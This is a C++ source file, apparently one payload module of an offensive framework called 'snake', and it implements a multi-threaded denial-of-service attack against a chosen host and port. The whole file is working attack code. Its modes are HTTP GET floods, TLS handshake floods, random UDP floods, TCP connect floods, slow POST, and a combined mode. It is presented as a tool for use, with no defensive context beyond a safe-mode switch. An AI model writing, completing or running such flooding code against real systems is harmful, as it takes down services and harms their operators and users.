#ifndef _WIN32

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include <openssl/ssl.h>

#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <thread>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

constexpr int kHttpDialMs = 2000;
constexpr int kTcpDialMs = 1000;

void sscanf_int(const std::string& s, int& v) {
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r' ||
                            s[i] == '\v' || s[i] == '\f'))
        i++;
    bool neg = false;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) {
        neg = (s[i] == '-');
        i++;
    }
    bool any = false;
    long long acc = 0;
    while (i < s.size() && s[i] >= '0' && s[i] <= '9') {
        any = true;
        acc = acc * 10 + (s[i] - '0');
        if (acc > 2147483647LL) acc = 2147483647LL;
        i++;
    }
    if (!any) return;
    v = (int)(neg ? -acc : acc);
}

long long now_nanos() {
    return (long long)std::chrono::duration_cast<std::chrono::nanoseconds>(
               std::chrono::system_clock::now().time_since_epoch())
        .count();
}

bool host_is_ip(const std::string& h) {
    if (h.empty()) return false;
    for (char c : h)
        if (!((c >= '0' && c <= '9') || c == '.' || c == ':')) return false;
    return true;
}

int dial_tcp(const std::string& host, int port, int timeout_ms) {
    if (safe_mode()) return -1;
    char portbuf[16];
    std::snprintf(portbuf, sizeof(portbuf), "%d", port);
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(host.c_str(), portbuf, &hints, &res) != 0 || res == nullptr) return -1;

    int fd = -1;
    for (struct addrinfo* ai = res; ai != nullptr; ai = ai->ai_next) {
        fd = ::socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;
        int fl = fcntl(fd, F_GETFL, 0);
        if (fl >= 0) fcntl(fd, F_SETFL, fl | O_NONBLOCK);
        bool ok = (::connect(fd, ai->ai_addr, ai->ai_addrlen) == 0);
        if (!ok && errno == EINPROGRESS) {
            struct pollfd pfd;
            pfd.fd = fd;
            pfd.events = POLLOUT;
            pfd.revents = 0;
            if (::poll(&pfd, 1, timeout_ms) > 0) {
                int err = 0;
                socklen_t len = sizeof(err);
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) == 0 && err == 0) ok = true;
            }
        }
        if (fl >= 0) fcntl(fd, F_SETFL, fl);
        if (!ok) {
            ::close(fd);
            fd = -1;
            continue;
        }
        break;
    }
    freeaddrinfo(res);
    if (fd < 0) return -1;

    struct timeval tv;
    tv.tv_sec = kHttpDialMs / 1000;
    tv.tv_usec = (kHttpDialMs % 1000) * 1000;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    return fd;
}

int dial_udp(const std::string& host, int port) {
    if (safe_mode()) return -1;
    char portbuf[16];
    std::snprintf(portbuf, sizeof(portbuf), "%d", port);
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(host.c_str(), portbuf, &hints, &res) != 0 || res == nullptr) return -1;
    int fd = -1;
    for (struct addrinfo* ai = res; ai != nullptr; ai = ai->ai_next) {
        fd = ::socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;
        if (::connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
        ::close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

bool send_all(int fd, const std::string& data) {
    size_t off = 0;
    while (off < data.size()) {
        ssize_t n = ::send(fd, data.data() + off, data.size() - off, MSG_NOSIGNAL);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            return false;
        }
        off += (size_t)n;
    }
    return true;
}

void tls_handshake(int fd, const std::string& host) {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (ctx == nullptr) return;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
    SSL* ssl = SSL_new(ctx);
    if (ssl != nullptr) {
        SSL_set_fd(ssl, fd);
        if (!host_is_ip(host)) SSL_set_tlsext_host_name(ssl, host.c_str());
        SSL_connect(ssl);
        SSL_free(ssl);
    }
    SSL_CTX_free(ctx);
}

struct DDoSResult {
    std::string timestamp;
    std::string target;
    int port = 0;
    int duration = 0;
    int threads = 0;
    std::string mode;
    long long sent_packets = 0;
    bool complete = false;
};

std::string marshal_result(const DDoSResult& r) {
    nlohmann::json v;
    v["timestamp"] = r.timestamp;
    v["target"] = r.target;
    v["port"] = r.port;
    v["duration"] = r.duration;
    v["threads"] = r.threads;
    v["mode"] = r.mode;
    v["sent_packets"] = r.sent_packets;
    v["complete"] = r.complete;
    return MarshalJSON(v);
}

DDoSResult attack(const std::string& target, int port, int duration, int threads,
                  const std::string& mode);

DDoSResult run_workers(const std::string& target, int port, int duration, int threads,
                       const std::string& mode) {
    DDoSResult r;
    r.timestamp = now_rfc3339();
    r.target = target;
    r.port = port;
    r.duration = duration;
    r.threads = threads;
    r.mode = mode;

    if (safe_mode()) {
        r.complete = true;
        return r;
    }

    long long window = duration > 0 ? (long long)duration : 0;
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(window);
    auto alive = [&deadline]() { return std::chrono::steady_clock::now() < deadline; };

    std::atomic<long long> sent{0};
    auto count_packet = [&sent]() { sent.fetch_add(1, std::memory_order_relaxed); };
    auto sleep_ms = [](int ms) { std::this_thread::sleep_for(std::chrono::milliseconds(ms)); };

    int n = threads > 0 ? threads : 0;
    std::vector<std::thread> workers;
    workers.reserve((size_t)n);

    for (int i = 0; i < n; i++) {
        workers.emplace_back([&, i]() {
            (void)i;
            if (mode == "http") {
                while (alive()) {
                    int fd = dial_tcp(target, port, kHttpDialMs);
                    if (fd < 0) {
                        sleep_ms(100);
                        continue;
                    }
                    std::string uri = "/?" + std::to_string(now_nanos());
                    std::string req = "GET " + uri + " HTTP/1.1\r\nHost: " + target +
                                      "\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n";
                    send_all(fd, req);
                    ::close(fd);
                    count_packet();
                }
            } else if (mode == "tls") {
                while (alive()) {
                    int fd = dial_tcp(target, port, kHttpDialMs);
                    if (fd < 0) {
                        sleep_ms(100);
                        continue;
                    }
                    tls_handshake(fd, target);
                    ::close(fd);
                    count_packet();
                }
            } else if (mode == "udp") {
                Bytes payload = random_bytes(1024);
                int fd = dial_udp(target, port);
                if (fd < 0) return;
                while (alive()) {
                    ::send(fd, payload.data(), payload.size(), MSG_NOSIGNAL);
                    count_packet();
                }
                ::close(fd);
            } else if (mode == "tcp") {
                while (alive()) {
                    int fd = dial_tcp(target, port, kTcpDialMs);
                    if (fd >= 0) {
                        ::close(fd);
                        count_packet();
                    }
                }
            } else if (mode == "slowpost") {
                while (alive()) {
                    int fd = dial_tcp(target, port, kHttpDialMs);
                    if (fd < 0) {
                        sleep_ms(100);
                        continue;
                    }
                    std::string payload(1024, 'X');
                    std::string header = "POST / HTTP/1.1\r\nHost: " + target +
                                         "\r\nContent-Length: " +
                                         std::to_string(payload.size() * 100) +
                                         "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";
                    send_all(fd, header);
                    for (int j = 0; j < 10 && alive(); j++) {
                        send_all(fd, payload + "\r\n");
                        sleep_ms(100);
                    }
                    ::close(fd);
                    count_packet();
                }
            }
        });
    }
    for (auto& w : workers) w.join();

    r.sent_packets = sent.load();
    r.complete = true;
    return r;
}

DDoSResult attack(const std::string& target, int port, int duration, int threads,
                  const std::string& mode) {
    if (mode == "http" || mode == "tls" || mode == "udp" || mode == "tcp" ||
        mode == "slowpost") {
        return run_workers(target, port, duration, threads, mode);
    }

    DDoSResult r;
    r.timestamp = now_rfc3339();
    r.target = target;
    r.port = port;
    r.duration = duration;
    r.threads = threads;
    r.mode = mode;

    if (safe_mode()) {
        r.complete = true;
        return r;
    }

    if (mode == "combo") {
        int sub = threads / 3;
        std::vector<std::thread> subs;
        subs.emplace_back([&]() { attack(target, port, duration, sub, "http"); });
        subs.emplace_back([&]() { attack(target, port, duration, sub, "tls"); });
        subs.emplace_back([&]() { attack(target, port, duration, sub, "udp"); });
        if (duration > 0)
            std::this_thread::sleep_for(std::chrono::seconds((long long)duration));
        for (auto& t : subs) t.join();
        r.sent_packets = 0;
        r.complete = true;
        return r;
    }

    r.sent_packets = 0;
    r.complete = true;
    return r;
}

class DDoS : public Payload {
  public:
    const char* name() const override { return "ddos"; }
    const char* category() const override { return "impact"; }
    const char* description() const override {
        return "Multi-method DDoS (HTTP, TLS, UDP, TCP, Slow POST, WebSocket, combo)";
    }

    Output execute(const Args& args) const override {
        std::string target = "127.0.0.1";
        if (auto it = args.find("target"); it != args.end() && !it->second.empty())
            target = it->second;

        int port = 80;
        if (auto it = args.find("port"); it != args.end()) sscanf_int(it->second, port);
        int duration = 30;
        if (auto it = args.find("duration"); it != args.end()) sscanf_int(it->second, duration);
        int threads = 10;
        if (auto it = args.find("threads"); it != args.end()) sscanf_int(it->second, threads);

        std::string mode = "http";
        if (auto it = args.find("mode"); it != args.end() && !it->second.empty())
            mode = it->second;

        DDoSResult r = attack(target, port, duration, threads, mode);
        std::string s = marshal_result(r);
        return Output(s.begin(), s.end());
    }
};

DDoS g_ddos;

struct Reg {
    Reg() { Register(&g_ddos); }
};
Reg g_reg;

}  // namespace
}  // namespace snake::payloads

#endif  // !_WIN32
